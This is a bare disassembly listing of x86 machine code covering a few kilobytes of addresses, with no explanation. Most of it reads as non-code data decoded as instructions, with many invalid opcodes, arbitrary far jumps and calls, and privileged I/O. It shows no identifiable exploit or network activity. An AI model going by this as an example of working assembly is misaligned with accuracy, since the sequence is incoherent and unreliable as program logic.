  41cce1:	fdiv   DWORD PTR [esi]
  41cce3:	(bad)  
  41cce5:	mov    edi,0x76aa0d84
  41ccea:	inc    ebx
  41cceb:	jno    0x41cd50
  41cced:	xchg   esp,eax
  41ccee:	jle    0x41cccb
  41ccf0:	loope  0x41cd0d
  41ccf2:	lods   eax,DWORD PTR ds:[esi]
  41ccf3:	imul   ecx,esi,0xb991300
  41ccf9:	call   FWORD PTR [ecx+0x1b]
  41ccfc:	sbb    ecx,DWORD PTR [ebp-0xbb9017b]
  41cd02:	cld    
  41cd03:	leave  
  41cd04:	test   al,0x66
  41cd06:	mov    dh,0xba
  41cd08:	or     bl,dl
  41cd0a:	mov    dh,0x38
  41cd0c:	ja     0x41cd4c
  41cd0e:	mov    edi,0x6dfd0596
  41cd13:	fstp   TBYTE PTR [esi+0x83b2519]
  41cd19:	aad    0x0
  41cd1b:	cmp    ebp,DWORD PTR [ebp-0x466240d7]
  41cd21:	in     eax,dx
  41cd22:	rcr    bl,cl
  41cd24:	rcr    BYTE PTR [ebx-0x76],cl
  41cd27:	cmp    BYTE PTR [ebx+0x2c000dbf],bl
  41cd2d:	add    eax,0x68508e05
  41cd32:	lods   eax,DWORD PTR ds:[esi]
  41cd33:	sub    eax,0xee82bf6c
  41cd38:	jg     0x41cd60
  41cd3a:	add    ebp,DWORD PTR [edi+edi*8]
  41cd3d:	lods   eax,DWORD PTR ds:[esi]
  41cd3e:	je     0x41cd1b
  41cd40:	stc    
  41cd41:	rcl    BYTE PTR [edi],0xe7
  41cd44:	jb     0x41cd5a
  41cd46:	mov    edi,0x9300527d
  41cd4b:	jbe    0x41cd4d
  41cd4d:	in     al,0x63
  41cd4f:	div    BYTE PTR [ecx+eiz*4+0x2d]
  41cd53:	les    eax,FWORD PTR ds:0xbf56c976
  41cd59:	pop    ebx
  41cd5a:	adc    DWORD PTR [ebp-0x483938db],esp
  41cd60:	ror    al,0xff
  41cd63:	xchg   edx,eax
  41cd64:	clc    
  41cd65:	and    BYTE PTR [ebp+0x37],ch
  41cd68:	mov    dh,0x8d
  41cd6a:	mov    bl,0x15
  41cd6c:	mov    ecx,0xcb212fbf
  41cd71:	and    ch,BYTE PTR [ebp-0x3d2520d5]
  41cd77:	lods   eax,DWORD PTR ds:[esi]
  41cd78:	mov    edi,0x88599c44
  41cd7d:	push   ds
  41cd7e:	gs mov edi,0xef002e07
  41cd84:	or     dh,BYTE PTR ss:[edi-0x6fffe70e]
  41cd8b:	(bad)  
  41cd8d:	mov    al,0x7d
  41cd8f:	adc    ebp,DWORD PTR [ecx-0x7f]
  41cd92:	clc    
  41cd93:	ins    DWORD PTR es:[edi],dx
  41cd94:	pop    ebx
  41cd95:	fidivr DWORD PTR [edi-0x58fc431a]
  41cd9b:	je     0x41cd41
  41cd9d:	jno    0x41ce1b
  41cd9f:	add    BYTE PTR [ecx+edx*4+0x2c],dl
  41cda3:	fcomp  QWORD PTR [edx]
  41cda5:	fist   WORD PTR [ebx-0x1c9aff1a]
  41cdab:	inc    ebp
  41cdac:	add    eax,0xd7b8dc27
  41cdb1:	ds pop ebp
  41cdb3:	fisubr DWORD PTR [eax]
  41cdb5:	lods   al,BYTE PTR ds:[esi]
  41cdb6:	pop    edx
  41cdb7:	push   0xbfca4b53
  41cdbc:	mov    edx,0xfb6dd6fa
  41cdc1:	(bad)  
  41cdc2:	mov    al,0xbf
  41cdc4:	cmp    al,0xbb
  41cdc6:	add    BYTE PTR [ecx],bh
  41cdc8:	inc    ecx
  41cdc9:	or     al,0x95
  41cdcb:	sbb    DWORD PTR [esi-0x3449ea81],ebp
  41cdd1:	jmp    FWORD PTR [ebx+0x9eb300]
  41cdd7:	pop    edi
  41cdd8:	test   BYTE PTR [eax],al
  41cdda:	and    BYTE PTR ds:0xa6ed0510,bl
  41cde0:	mov    cl,0xb5
  41cde2:	mov    al,0xb5
  41cde4:	fst    QWORD PTR [ecx]
  41cde6:	sar    BYTE PTR [edi+0x48e73f7],1
  41cdec:	jmp    0x41cda4
  41cdee:	mov    ch,0xb0
  41cdf0:	rol    BYTE PTR [ecx],0xd3
  41cdf3:	les    esi,FWORD PTR [ebx-0x23]
  41cdf6:	mov    eax,ds:0xdae573f5
  41cdfb:	pop    esp
  41cdfc:	dec    ebx
  41cdfd:	pop    ebx
  41cdfe:	lods   eax,DWORD PTR ds:[esi]
  41cdff:	xchg   edi,eax
  41ce00:	sbb    ch,al
  41ce02:	jg     0x41cde7
  41ce04:	fcomp  st(2)
  41ce06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce07:	repnz pop edi
  41ce09:	xor    bh,bh
  41ce0b:	pop    edx
  41ce0c:	add    cl,bl
  41ce0e:	push   edi
  41ce0f:	add    BYTE PTR [esi+0x6a],al
  41ce12:	add    eax,0x44cb4bcc
  41ce17:	pop    ebp
  41ce18:	push   0x39fc13b7
  41ce1d:	xlat   BYTE PTR ds:[ebx]
  41ce1e:	and    bh,BYTE PTR [ebp-0x4b8a54c5]
  41ce24:	pop    ebp
  41ce25:	ror    bh,0x2c
  41ce28:	mov    eax,ds:0x58adbd3f
  41ce2d:	imul   ebx,ebx,0xffffffda
  41ce30:	ins    DWORD PTR es:[edi],dx
  41ce31:	mov    ebx,0x131fa1c8
  41ce36:	add    eax,0x6494d4e3
  41ce3b:	sti    
  41ce3c:	mov    ch,0xb4
  41ce3e:	jno    0x41cdd1
  41ce40:	xchg   ebp,eax
  41ce41:	pop    edx
  41ce42:	jno    0x41ce4c
  41ce44:	push   es
  41ce45:	jg     0x41ce77
  41ce47:	(bad)  
  41ce48:	aam    0xc2
  41ce4a:	ins    DWORD PTR es:[edi],dx
  41ce4b:	sti    
  41ce4c:	inc    edx
  41ce4d:	sar    DWORD PTR [eax-0x9],cl
  41ce50:	add    BYTE PTR [ebp-0x59],dh
  41ce53:	dec    eax
  41ce54:	pop    ss
  41ce55:	ja     0x41ce41
  41ce57:	jg     0x41ce71
  41ce59:	mov    dh,0xc2
  41ce5b:	(bad)  
  41ce5c:	shl    bh,0xda
  41ce5f:	mov    BYTE PTR [edi],dl
  41ce61:	pop    esp
  41ce62:	jg     0x41cebf
  41ce64:	mov    ebx,0x6c972ed0
  41ce69:	test   eax,0xcb4d91b9
  41ce6e:	adc    al,0xe3
  41ce70:	aas    
  41ce71:	adc    DWORD PTR [edx-0x5f],0x4000d4f0
  41ce78:	mov    edi,0x8f6f2b7f
  41ce7d:	(bad)  
  41ce7e:	out    0x7f,al
  41ce80:	pusha  
  41ce81:	mov    dl,0x3f
  41ce83:	mov    BYTE PTR [edx+0x9a5300],dl
  41ce89:	and    al,0x17
  41ce8b:	add    BYTE PTR [ecx+eiz*8],ah
  41ce8e:	add    BYTE PTR ds:0xb0b0a396,ah
  41ce94:	jge    0x41ce51
  41ce96:	mov    dh,0x47
  41ce98:	mov    al,0x9d
  41ce9a:	xchg   DWORD PTR [eax-0x5481a937],ecx
  41cea0:	jno    0x41ceda
  41cea2:	add    eax,0x77f9a30f
  41cea7:	add    BYTE PTR [edi+0x4a],ah
  41ceaa:	mov    edi,0xe369e466
  41ceaf:	in     al,dx
  41ceb0:	imul   eax,eax,0xfffffff9
  41ceb3:	mov    edi,0x466956d9
  41ceb8:	sahf   
  41ceb9:	xchg   ecx,eax
  41ceba:	fs loop 0x41ceb0
  41cebd:	sub    eax,DWORD PTR [edx]
  41cebf:	xchg   ecx,eax
  41cec0:	data16 in al,0x19
  41cec3:	mov    ch,0x9d
  41cec5:	sub    DWORD PTR [eax],ebp
  41cec7:	sbb    DWORD PTR [ecx+0x46],ebp
  41ceca:	sahf   
  41cecb:	mov    ds:0x5bce1cbf,eax
  41ced0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ced2:	arpl   sp,sp
  41ced4:	inc    ecx
  41ced5:	repz dec esp
  41ced8:	inc    edi
  41ced9:	jns    0x41cf21
  41cedb:	call   0x1529:0xeac67b91
  41cee2:	xchg   ecx,eax
  41cee3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41cee5:	sbb    DWORD PTR [ecx+0x19373280],esp
  41ceeb:	jns    0x41cf33
  41ceed:	call   0x9a6f:0x4d2ec2ea
  41cef4:	xchg   ecx,eax
  41cef5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41cef7:	cmp    dh,ah
  41cef9:	scas   eax,DWORD PTR es:[edi]
  41cefa:	push   esi
  41cefb:	push   ds
  41cefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cefd:	sbb    DWORD PTR [ecx+0x46],edi
  41cf00:	lds    eax,FWORD PTR [ecx-0x65b983a1]
  41cf06:	xchg   ecx,eax
  41cf07:	addr16 mov al,ds:0x1beb
  41cf0b:	pop    edx
  41cf0c:	test   BYTE PTR [ecx],ah
  41cf0e:	mov    dl,0x1c
  41cf10:	jns    0x41cee7
  41cf12:	sbb    bh,BYTE PTR [esi]
  41cf14:	inc    eax
  41cf15:	adc    ebx,edi
  41cf17:	push   ss
  41cf18:	mov    dh,0x76
  41cf1a:	inc    eax
  41cf1b:	lea    edi,[ebp-0x5f]
  41cf1e:	jno    0x41cf0b
  41cf20:	icebp  
  41cf21:	lods   eax,DWORD PTR ds:[esi]
  41cf22:	adc    esp,DWORD PTR [esi-0x27209c00]
  41cf28:	mov    dh,0x1b
  41cf2a:	aas    
  41cf2b:	popa   
  41cf2c:	gs add eax,0x3fd68fa1
  41cf32:	rol    DWORD PTR [eax],cl
  41cf34:	(bad)  
  41cf35:	not    BYTE PTR ds:0x1d6a581a
  41cf3b:	add    eax,0xa93cff48
  41cf40:	push   esi
  41cf41:	outs   dx,BYTE PTR ds:[esi]
  41cf42:	mov    al,0xb5
  41cf44:	imul   esp,DWORD PTR [edi+0xd],0x39
  41cf48:	enter  0x8a9c,0x17
  41cf4c:	outs   dx,BYTE PTR ds:[esi]
  41cf4d:	xchg   esp,eax
  41cf4e:	inc    esi
  41cf50:	sub    al,0x3f
  41cf52:	sub    DWORD PTR [ecx],esi
  41cf54:	add    BYTE PTR [ecx+ebx*8],bl
  41cf57:	add    BYTE PTR [ecx-0x62],bh
  41cf5a:	call   DWORD PTR [esi+ebp*4-0x2e4575c5]
  41cf61:	stos   BYTE PTR es:[edi],al
  41cf62:	fcom   DWORD PTR [eax]
  41cf64:	(bad)  
  41cf65:	retf   
  41cf66:	xor    ch,bh
  41cf68:	mov    dh,0x5f
  41cf6a:	sbb    ecx,DWORD PTR [ebx]
  41cf6c:	call   0x2283:0x7f7f3f82
  41cf73:	mov    eax,ds:0x6360fb73
  41cf78:	fistp  DWORD PTR [ecx+esi*8-0x53]
  41cf7c:	adc    DWORD PTR [esi],ebx
  41cf7e:	mov    di,0x572
  41cf82:	retf   
  41cf83:	jg     0x41cf28
  41cf85:	jno    0x41cf2e
  41cf87:	or     BYTE PTR [ebp+0x3f],al
  41cf8a:	aad    0xed
  41cf8c:	add    al,ch
  41cf8e:	xor    eax,0x474a9f00
  41cf93:	fistp  WORD PTR [eax+0x58]
  41cf96:	push   0x91bba9d1
  41cf9b:	mov    esp,0xa4b93f
  41cfa0:	mov    WORD PTR ds:0x49f28dff,gs
  41cfa6:	add    cl,ah
  41cfa8:	cs (bad) 
  41cfaa:	cmp    DWORD PTR [esi],ebx
  41cfac:	add    bh,bl
  41cfae:	ins    BYTE PTR es:[edi],dx
  41cfaf:	add    BYTE PTR [eax-0x24a078e1],ah
  41cfb5:	test   DWORD PTR [esi-0x2c3792fb],esi
  41cfbb:	xchg   ecx,eax
  41cfbc:	(bad)  
  41cfbe:	xor    bh,BYTE PTR [edi-0x7c]
  41cfc1:	lea    ebp,[ebp+0x44413370]
  41cfc7:	or     DWORD PTR [edi-0x77],0x37fcff75
  41cfce:	push   ss
  41cfcf:	mov    dh,0xfc
  41cfd1:	lods   eax,DWORD PTR ds:[esi]
  41cfd2:	pop    ss
  41cfd3:	dec    edi
  41cfd4:	push   0x75653f
  41cfd9:	pop    eax
  41cfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfdb:	add    BYTE PTR [edi],dh
  41cfdd:	fimul  DWORD PTR [ebp-0x5c9e93]
  41cfe3:	fidiv  WORD PTR [esi+0x2b]
  41cfe6:	ror    DWORD PTR [edi+edi*1-0x65],1
  41cfea:	fsubr  DWORD PTR [eax]
  41cfec:	dec    DWORD PTR [ecx+0x5d]
  41cfef:	add    BYTE PTR [ecx+edi*4+0x0],bh
  41cff3:	sub    DWORD PTR [esi-0x2b806901],edi
  41cff9:	add    BYTE PTR [ebx-0xd],dh
  41cffc:	jl     0x41cf98
  41cffe:	xor    BYTE PTR [esi],ah
  41d000:	inc    ebx
  41d001:	mov    ds:0x1400f28d,al
  41d006:	sbb    dh,BYTE PTR ss:[edi-0x55cb5df3]
  41d00d:	ins    DWORD PTR es:[edi],dx
  41d00e:	xchg   BYTE PTR [edi],bh
  41d010:	call   FWORD PTR [ebx+0x1697fcad]
  41d016:	push   ebp
  41d017:	xchg   DWORD PTR [ecx-0x8],esi
  41d01a:	ja     0x41d01c
  41d01c:	cmc    
  41d01d:	inc    DWORD PTR [eax]
  41d01f:	enter  0x7415,0x28
  41d023:	sbb    ebx,ebx
  41d025:	(bad)  
  41d026:	jmp    0x179c3a2a
  41d02b:	ds inc ebp
  41d02d:	pop    ebx
  41d02e:	fistp  WORD PTR [eax+0x58]
  41d031:	pop    eax
  41d032:	mov    ch,0xec
  41d034:	shl    BYTE PTR [ecx+0x53ffcd9d],1
  41d03a:	jle    0x41d03c
  41d03c:	mov    edi,0xf28d8db7
  41d041:	sbb    al,0x0
  41d043:	sar    BYTE PTR [edi],0xb1
  41d046:	xor    BYTE PTR [edi+0x2fb1a1eb],0x6c
  41d04d:	int    0x4b
  41d04f:	ins    BYTE PTR es:[edi],dx
  41d050:	imul   edx,DWORD PTR [edx],0x7f
  41d053:	jp     0x41d055
  41d055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d056:	xchg   edx,eax
  41d057:	add    eax,0x6b71b061
  41d05c:	sub    al,0xa0
  41d05e:	push   ss
  41d05f:	aas    
  41d060:	pop    esp
  41d061:	pop    ss
  41d062:	ss int3 
  41d064:	push   eax
  41d065:	push   0xffffffcb
  41d067:	jg     0x41d00c
  41d069:	popf   
  41d06a:	aas    
  41d06b:	test   esp,edi
  41d06d:	add    BYTE PTR [eax-0x5fcff7b],bh
  41d073:	test   DWORD PTR [ecx-0x47],0xa15b75bc
  41d07a:	or     esp,DWORD PTR [ebx]
  41d07c:	ins    BYTE PTR es:[edi],dx
  41d07d:	jmp    0x41d0fe
  41d07f:	jge    0x41d081
  41d081:	pop    esp
  41d082:	sbb    eax,0x716c6fde
  41d087:	jecxz  0x41d05b
  41d089:	push   ecx
  41d08a:	das    
  41d08b:	test   al,0x78
  41d08d:	iret   
  41d08e:	jmp    DWORD PTR [eax+0x0]
  41d091:	jo     0x41d035
  41d093:	ins    DWORD PTR es:[edi],dx
  41d094:	xchg   edi,eax
  41d095:	xchg   edi,eax
  41d096:	mov    ebp,0xaa4100c2
  41d09b:	xor    BYTE PTR [eax+0x5b1ba1ce],0x63
  41d0a2:	imul   edi,DWORD PTR [edi+0x22],0xffffffad
  41d0a6:	rcr    DWORD PTR [ebp-0x23],1
  41d0a9:	and    eax,0x4c17bb93
  41d0ae:	xor    al,0x6e
  41d0b0:	add    eax,0x7f45ec67
  41d0b5:	jp     0x41d0df
  41d0b7:	cmc    
  41d0b8:	cld    
  41d0b9:	aaa    
  41d0ba:	push   ss
  41d0bb:	sbb    dh,BYTE PTR [ebp-0x63]
  41d0be:	or     edi,edi
  41d0c0:	sahf   
  41d0c1:	mov    edx,0xa7b00
  41d0c6:	cld    
  41d0c7:	jnp    0x41d100
  41d0c9:	push   ss
  41d0ca:	fisubr DWORD PTR [ebp+0x6e09ccfe]
  41d0d0:	pop    ebx
  41d0d1:	in     eax,dx
  41d0d2:	(bad)  
  41d0d3:	jns    0x41d133
  41d0d5:	lods   eax,DWORD PTR ds:[esi]
  41d0d6:	ret    0xfcad
  41d0d9:	add    BYTE PTR [edi+0x5fe00010],bl
  41d0df:	jno    0x41d0c1
  41d0e1:	sub    eax,0xbcc19185
  41d0e6:	ror    BYTE PTR [ebp+0x7246ffd1],0xff
  41d0ed:	ss add ah,al
  41d0f0:	aaa    
  41d0f1:	mov    dh,0x8d
  41d0f3:	lods   eax,DWORD PTR ds:[esi]
  41d0f4:	jo     0x41d07a
  41d0f6:	inc    ecx
  41d0f7:	mov    ecx,DWORD PTR [ebx]
  41d0f9:	mov    ch,0xff
  41d0fb:	lods   eax,DWORD PTR ss:[esi]
  41d0fd:	xlat   BYTE PTR ds:[ebx]
  41d0fe:	mov    ds:0x6b9637fc,eax
  41d103:	test   al,0x3f
  41d105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d106:	test   al,0x0
  41d108:	cwde   
  41d109:	gs add bl,dh
  41d10c:	sbb    bh,bh
  41d10e:	dec    DWORD PTR [ebp+0x2a6a7685]
  41d114:	fisub  DWORD PTR [esp+ecx*4+0x3f]
  41d118:	mov    DWORD PTR [ebx+0x79bc00],ebp
  41d11e:	paddd  mm0,QWORD PTR [ecx-0xd72493]
  41d125:	jecxz  0x41d0b6
  41d127:	paddd  mm6,QWORD PTR [eax-0x1]
  41d12b:	sbb    ecx,DWORD PTR [ebx-0x7b]
  41d12e:	fwait
  41d12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d130:	push   eax
  41d131:	popf   
  41d132:	and    cl,BYTE PTR [ebp+0x61]
  41d135:	push   esi
  41d137:	stc    
  41d138:	outs   dx,DWORD PTR ds:[esi]
  41d139:	mov    ah,0x6e
  41d13b:	add    eax,0x3f915c23
  41d140:	push   ecx
  41d141:	pop    eax
  41d142:	add    BYTE PTR [ecx+esi*4+0x0],dh
  41d146:	ret    
  41d147:	mov    BYTE PTR [edi],0x96
  41d14a:	inc    DWORD PTR [esi-0x1]
  41d14d:	int3   
  41d14e:	xchg   BYTE PTR [eax],al
  41d150:	inc    edi
  41d151:	xor    al,BYTE PTR [eax]
  41d153:	cmp    BYTE PTR [edi+0x46793f29],dh
  41d159:	call   0x970c:0x18bba591
  41d160:	xchg   ecx,eax
  41d161:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d163:	sbb    DWORD PTR [ebp+0x1971eb06],esi
  41d169:	jns    0x41d1b1
  41d16b:	call   0x9a4b:0x5bd4e47c
  41d172:	xchg   ecx,eax
  41d173:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d175:	retf   0x3dc4
  41d178:	ds push eax
  41d17a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d17b:	sbb    DWORD PTR [ecx+0x46],edi
  41d17e:	fdivr  DWORD PTR ds:0x9a468834
  41d184:	xchg   ecx,eax
  41d185:	addr16 xchg ecx,eax
  41d187:	pop    ds
  41d188:	icebp  
  41d189:	outs   dx,BYTE PTR ds:[esi]
  41d18a:	movs   BYTE PTR es:[di],BYTE PTR gs:[si]
  41d18d:	sbb    DWORD PTR [ecx-0xf],edi
  41d190:	repz dec esp
  41d192:	dec    ecx
  41d193:	jns    0x41d1db
  41d195:	call   0xa520:0x2aeedb91
  41d19c:	xchg   ecx,eax
  41d19d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d19f:	sbb    DWORD PTR [eax+esi*1+0x79198701],esp
  41d1a6:	inc    esi
  41d1a7:	call   0xdb0e:0x69e41693
  41d1ae:	fcomp  st(2)
  41d1b0:	ins    DWORD PTR es:[edi],dx
  41d1b1:	push   edi
  41d1b2:	sar    DWORD PTR [eax+0x5e],1
  41d1b5:	das    
  41d1b6:	sub    BYTE PTR [edx-0x1],0x67
  41d1ba:	xor    eax,0x6ddad85d
  41d1bf:	inc    edx
  41d1c0:	ja     0x41d231
  41d1c2:	cmp    DWORD PTR ds:0x5aca771d,eax
  41d1c8:	jle    0x41d168
  41d1ca:	xchg   ecx,eax
  41d1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1cc:	lods   eax,DWORD PTR ds:[esi]
  41d1cd:	jmp    0x41d17c
  41d1cf:	ds mov edi,0xe4688ffd
  41d1d5:	sbb    DWORD PTR [ecx+0x46],ebp
  41d1d8:	sub    bl,bl
  41d1da:	lea    edx,[edx+0x46]
  41d1dd:	sahf   
  41d1de:	xchg   ecx,eax
  41d1df:	popw   ss
  41d1e1:	shl    DWORD PTR [eax-0x4c],0xf7
  41d1e5:	data16 in al,0x19
  41d1e8:	imul   esp,DWORD PTR [edi],0x69dce670
  41d1ee:	inc    esi
  41d1ef:	sahf   
  41d1f0:	xchg   ecx,eax
  41d1f1:	jne    0x41d246
  41d1f3:	sub    BYTE PTR [ecx-0x1b996eed],0x19
  41d1fa:	cmp    eax,0x1929959a
  41d1ff:	imul   eax,DWORD PTR [esi-0x62],0xcf43bc07
  41d206:	nop
  41d207:	sahf   
  41d208:	xchg   ecx,eax
  41d209:	data16 in al,0x19
  41d20c:	dec    ebp
  41d20d:	mov    ah,0xe4
  41d20f:	and    esp,esp
  41d211:	sbb    DWORD PTR [ecx+0x46],ebp
  41d214:	jge    0x41d1e8
  41d216:	lods   eax,DWORD PTR ds:[esi]
  41d217:	pop    ebp
  41d218:	inc    esi
  41d219:	sahf   
  41d21a:	xchg   ecx,eax
  41d21b:	data16 and cl,al
  41d21e:	mov    ds:0xe4661d7f,al
  41d223:	sbb    DWORD PTR [ecx-0x12],ebp
  41d226:	ins    BYTE PTR es:[edi],dx
  41d227:	xchg   ecx,eax
  41d228:	jmp    0x790c:0x919e4669
  41d22f:	mov    ebx,0x66912ad8
  41d234:	in     al,0x19
  41d236:	push   0x1950a7a5
  41d23b:	imul   eax,DWORD PTR [esi-0x62],0x768ac720
  41d242:	xor    DWORD PTR [edi-0x161b991a],ebx
  41d248:	(bad)  
  41d249:	std    
  41d24a:	add    cl,bh
  41d24c:	fild   QWORD PTR [eax+0x6b]
  41d24f:	out    0xd3,eax
  41d251:	fdivr  QWORD PTR [edx+edx*2]
  41d254:	fild   DWORD PTR [eax]
  41d256:	fucomp st(6)
  41d258:	push   edx
  41d259:	dec    edi
  41d25a:	repz jl 0x41d1f7
  41d25d:	fwait
  41d25e:	pop    ecx
  41d25f:	rol    DWORD PTR [eax],0xc1
  41d262:	test   al,0x34
  41d264:	xor    esi,DWORD PTR [esi]
  41d266:	ins    DWORD PTR es:[edi],dx
  41d267:	sbb    BYTE PTR [edx+0x73],cl
  41d26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d26b:	add    BYTE PTR [ebp-0x5357b07b],ah
  41d271:	aaa    
  41d272:	iret   
  41d273:	ucomiss xmm3,xmm5
  41d276:	out    dx,eax
  41d277:	lock mov edi,0x743d0719
  41d27d:	add    BYTE PTR [ecx-0x1a],bh
  41d280:	out    0xf9,al
  41d282:	xor    al,0x63
  41d284:	jecxz  0x41d271
  41d286:	jmp    0x3cdc:0xd35d0052
  41d28d:	lahf   
  41d28e:	push   ecx
  41d28f:	(bad)  
  41d291:	lock dec eax
  41d293:	add    BYTE PTR [ecx+0x2d],al
  41d296:	jl     0x41d232
  41d298:	fwait
  41d299:	out    0xbf,eax
  41d29b:	mov    bl,0xbe
  41d29d:	add    BYTE PTR cs:0x9e979105,ah
  41d2a4:	dec    edi
  41d2a5:	jae    0x41d29a
  41d2a7:	scas   eax,DWORD PTR es:[edi]
  41d2a8:	or     al,0x0
  41d2aa:	or     DWORD PTR [eax+ebx*8+0x79],edi
  41d2ae:	dec    edi
  41d2af:	int    0xf3
  41d2b1:	imul   ebp,DWORD PTR [esi+0x4b],0xc2e0ef00
  41d2b8:	pop    ebp
  41d2b9:	dec    edi
  41d2ba:	jno    0x41d257
  41d2bc:	jp     0x41d2fc
  41d2be:	int    0x0
  41d2c0:	rol    eax,cl
  41d2c2:	in     al,0x41
  41d2c4:	adc    bh,BYTE PTR [edi]
  41d2c6:	pop    ss
  41d2c7:	add    al,bl
  41d2c9:	xchg   BYTE PTR [edx+ebx*4-0x49],bh
  41d2cd:	mov    ds:0x9b4a25b6,al
  41d2d2:	jae    0x41d2c7
  41d2d4:	jl     0x41d310
  41d2d6:	mov    edi,0x1f09908f
  41d2db:	jecxz  0x41d2dd
  41d2dd:	jg     0x41d348
  41d2df:	outs   dx,BYTE PTR ds:[esi]
  41d2e0:	sahf   
  41d2e1:	dec    edi
  41d2e2:	jnp    0x41d34e
  41d2e4:	in     eax,dx
  41d2e5:	in     eax,0xf9
  41d2e7:	add    BYTE PTR [ebx+0x24],ah
  41d2ea:	ds int 0xcd
  41d2ed:	repz int3 
  41d2ef:	rcr    esi,cl
  41d2f1:	pop    edi
  41d2f2:	add    BYTE PTR [ebp+0x33],al
  41d2f5:	scas   al,BYTE PTR es:[edi]
  41d2f6:	mov    bh,0xcf
  41d2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2f9:	mov    ecx,0x3dba79
  41d2fe:	sub    DWORD PTR [esi],ebp
  41d300:	mov    BYTE PTR [ebx+0x34f9e689],bl
  41d306:	aaa    
  41d307:	sbb    eax,DWORD PTR [eax]
  41d309:	or     eax,0x727f9219
  41d30e:	fdivr  QWORD PTR [edi+ebx*4]
  41d311:	out    0xe1,al
  41d313:	add    cl,dh
  41d315:	aad    0x74
  41d317:	arpl   WORD PTR [edx],sp
  41d319:	hlt    
  41d31a:	add    ch,dl
  41d31c:	out    0x8e,al
  41d31e:	out    0xd3,eax
  41d320:	fsubr  QWORD PTR [ebx+0x47]
  41d323:	dec    ebp
  41d324:	call   FWORD PTR [edx-0x527c4700]
  41d32a:	and    DWORD PTR [edi+0x732b0db8],ebx
  41d330:	popf   
  41d331:	mov    edi,0xa7cf3734
  41d336:	mov    ecx,DWORD PTR [edi]
  41d338:	bndstx [esi-0x608b7f00],bnd3
  41d33f:	out    0xe6,al
  41d341:	stc    
  41d342:	jmp    0xbecf3a
  41d347:	gs popa 
  41d349:	ret    
  41d34a:	xlat   BYTE PTR ds:[ebx]
  41d34b:	out    0xd3,eax
  41d34d:	fdivr  QWORD PTR [esi+ebp*4]
  41d350:	in     al,0x0
  41d352:	dec    ebx
  41d353:	jg     0x41d368
  41d355:	mov    ecx,0x9b9a7cf3
  41d35a:	mov    edi,0x2a2f0082
  41d35f:	adc    ebx,DWORD PTR [ebp+0x4f9e6ea1]
  41d365:	jae    0x41d320
  41d367:	add    BYTE PTR [ebx],dl
  41d369:	push   es
  41d36a:	sub    al,0x81
  41d36c:	push   edx
  41d36d:	pop    edi
  41d36e:	add    bh,dh
  41d370:	int    0xcd
  41d372:	repz imul edi,edi,0x6a6d65ce
  41d379:	add    bl,bl
  41d37b:	leave  
  41d37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d37d:	mov    ecx,0x49fd3e79
  41d382:	dec    esi
  41d383:	adc    al,0x0
  41d385:	mov    edi,0x3734f9a7
  41d38a:	iret   
  41d38b:	popf   
  41d38c:	sub    eax,0xa3000525
  41d391:	in     al,0x39
  41d393:	adc    edi,DWORD PTR [edi+ebx*4]
  41d396:	out    0xe6,al
  41d398:	push   ds
  41d399:	lods   al,BYTE PTR ds:[esi]
  41d39a:	add    BYTE PTR [ebp-0x5082c8d],al
  41d3a0:	fwait
  41d3a1:	out    0xd3,eax
  41d3a3:	fadd   QWORD PTR [edx+0x0]
  41d3a6:	imul   ebp,DWORD PTR [esi-0xb],0x68c6db
  41d3ad:	ins    BYTE PTR es:[edi],dx
  41d3ae:	shl    bl,0x90
  41d3b1:	dec    ebp
  41d3b2:	out    0xbf,eax
  41d3b4:	test   al,0x3f
  41d3b6:	push   ss
  41d3b7:	mov    al,0xb5
  41d3b9:	dec    edi
  41d3ba:	repz adc eax,0x65a2e281
  41d3c0:	sub    al,0x8b
  41d3c2:	push   ebx
  41d3c3:	in     eax,dx
  41d3c4:	(bad)  
  41d3c5:	mov    dh,0x7f
  41d3c7:	stos   DWORD PTR es:[edi],eax
  41d3c8:	dec    edx
  41d3c9:	xchg   esi,eax
  41d3ca:	jg     0x41d37f
  41d3cc:	cld    
  41d3cd:	cmp    edi,0x73
  41d3d0:	jae    0x41d445
  41d3d2:	jae    0x41d3d9
  41d3d4:	add    BYTE PTR [ebx+0xe],ah
  41d3d7:	add    BYTE PTR [edx+0x17],bh
  41d3da:	add    BYTE PTR [ebx+0x10],bh
  41d3dd:	add    BYTE PTR [ecx],ch
  41d3df:	mov    eax,ds:0xe626532d
  41d3e4:	push   DWORD PTR [esi+0x2a]
  41d3e7:	mov    edi,0xa467919a
  41d3ec:	mov    cl,0xea
  41d3ee:	cmp    al,0x23
  41d3f0:	iret   
  41d3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f2:	sbb    DWORD PTR [ecx+0x46],edi
  41d3f5:	mov    bl,0x5e
  41d3f7:	sub    eax,0x919a46ed
  41d3fc:	xor    BYTE PTR [bx+si+0x1b],0x3
  41d401:	bound  edi,QWORD PTR [ecx-0x6586e65c]
  41d407:	shr    DWORD PTR [ecx],1
  41d409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d40a:	xchg   ecx,eax
  41d40b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d40d:	sbb    edi,ecx
  41d40f:	aaa    
  41d410:	add    esi,eax
  41d412:	cmp    al,0x3f
  41d414:	inc    esi
  41d415:	call   0x96e8:0xff2155aa
  41d41c:	out    dx,al
  41d41d:	int    0xc8
  41d41f:	rcr    esp,cl
  41d421:	xchg   BYTE PTR [eax],al
  41d423:	or     ebp,DWORD PTR [esi]
  41d425:	icebp  
